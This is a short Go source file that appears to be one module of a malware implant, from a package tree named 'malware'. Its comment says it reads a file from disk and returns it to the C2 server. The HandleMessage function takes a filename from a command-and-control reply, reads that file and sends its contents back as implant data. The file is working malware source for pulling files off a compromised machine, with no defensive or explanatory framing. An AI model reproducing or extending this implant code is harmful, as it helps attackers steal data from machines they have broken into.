package file_extractor

import (
	"io/ioutil"
	"malware/common/messages"
	"malware/common/types"
)

/**

Most basic module
Reads a file from disk and returns it to C2

*/

type settings struct {
}

// Create creates an implementation of settings
func Create() types.Module {
	return settings{}
}

func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.CheckCmdRequest)) bool {
	file := message.GetGetfile()
	if file == nil {
		return false
	}

	out, err := ioutil.ReadFile(file.Filename)
	if err != nil {
		callback(messages.Implant_error(settings.ID(), types.ERR_FILE_NOT_FOUND))
	} else {
		callback(messages.Implant_data(settings.ID(), out))
	}
	return true
}

// This module has no init/shutdown needs
func (settings settings) Init() {
}

func (settings settings) Shutdown() {
}

func (settings) ID() string { return "file_extractor" }
